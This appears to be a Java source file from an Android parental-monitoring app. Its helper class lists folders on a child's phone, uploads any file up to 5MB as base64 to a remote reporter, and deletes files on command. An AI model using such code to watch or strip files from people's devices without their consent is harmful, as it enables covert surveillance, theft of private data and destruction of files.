package com.nullx.pp;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.net.Uri;
import android.content.Intent;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Helper untuk mengakses file system di perangkat anak.
 */
public class FileManagerHelper {
    
    public static void listDirectory(Context context, String path) {
        new Thread(() -> {
            JSONObject out = new JSONObject();
            JSONArray files = new JSONArray();
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                    out.put("permissionRequired", true);
                    out.put("permission", "MANAGE_EXTERNAL_STORAGE");
                    GuardianCommandReporter.post(context, "file_manager", out);
                    return;
                }
                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) {
                    out.put("error", "Directory not found");
                    GuardianCommandReporter.post(context, "file_manager", out);
                    return;
                }
                
                File[] list = dir.listFiles();
                if (list != null) {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                    for (File f : list) {
                        JSONObject fo = new JSONObject();
                        fo.put("name", f.getName());
                        fo.put("path", f.getAbsolutePath());
                        fo.put("isDir", f.isDirectory());
                        fo.put("size", f.length());
                        fo.put("lastModified", f.lastModified());
                        fo.put("lastModifiedStr", sdf.format(new Date(f.lastModified())));
                        fo.put("canRead", f.canRead());
                        fo.put("canWrite", f.canWrite());
                        fo.put("hidden", f.isHidden());
                        files.put(fo);
                    }
                }
                
                out.put("path", path);
                out.put("parent", dir.getParent());
                out.put("files", files);
                out.put("count", files.length());
                out.put("totalSize", dir.getTotalSpace());
                out.put("freeSpace", dir.getFreeSpace());
            } catch (Exception e) {
                try { out.put("error", e.toString()); } catch (Exception ignored) {}
            }
            GuardianCommandReporter.post(context, "file_manager", out);
        }).start();
    }
    
    public static void downloadFile(Context context, String filePath) {
        new Thread(() -> {
            JSONObject out = new JSONObject();
            try {
                File f = new File(filePath);
                if (!f.exists() || !f.isFile()) {
                    out.put("error", "File not found");
                    GuardianCommandReporter.post(context, "file_download", out);
                    return;
                }
                
                // Batasi ukuran file yang bisa didownload (max 5MB)
                if (f.length() > 5 * 1024 * 1024) {
                    out.put("error", "File too large (max 5MB)");
                    GuardianCommandReporter.post(context, "file_download", out);
                    return;
                }
                
                byte[] data = new byte[(int) f.length()];
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                fis.read(data);
                fis.close();
                
                out.put("name", f.getName());
                out.put("path", f.getAbsolutePath());
                out.put("size", f.length());
                out.put("data", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP));
            } catch (Exception e) {
                try { out.put("error", e.toString()); } catch (Exception ignored) {}
            }
            GuardianCommandReporter.post(context, "file_download", out);
        }).start();
    }
    
    public static void deleteFile(Context context, String filePath) {
        new Thread(() -> {
            JSONObject out = new JSONObject();
            try {
                File f = new File(filePath);
                if (f.exists()) {
                    boolean deleted = f.delete();
                    out.put("deleted", deleted);
                    out.put("path", filePath);
                } else {
                    out.put("error", "File not found");
                }
            } catch (Exception e) {
                try { out.put("error", e.toString()); } catch (Exception ignored) {}
            }
            GuardianCommandReporter.post(context, "file_delete", out);
        }).start();
    }
}